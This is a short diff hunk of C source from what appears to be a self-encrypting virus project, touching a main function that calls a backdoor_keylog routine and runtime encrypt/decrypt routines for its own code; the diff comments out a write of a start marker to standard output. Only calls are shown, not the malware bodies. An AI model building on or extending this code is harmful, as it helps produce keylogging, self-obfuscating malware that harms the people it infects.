@@ -448,7 +448,7 @@ static void	backdoor_keylog()
 int		main(void)
 {
 	size_t			tab_addr[33];
-	char			buf[BUF_SIZE];
+// 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
 	uint32_t		tmp_index;
 	t_fingerprint		fingerprint;
@@ -469,8 +469,8 @@ int		main(void)
 	if (info.in_pestilence == 0)
 		backdoor_keylog();
 	reencrypt_func(&info, &check_process, info.tab_addr[12] - info.tab_addr[11], key);
-	write_begin(buf);
-	ft_syswrite(1, buf, 8);
+// 	write_begin(buf);
+// 	ft_syswrite(1, buf, 8);
 	write_test2(buf_path);
 	fingerprint.fingerprint = 0;
 	key = decrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], 30);
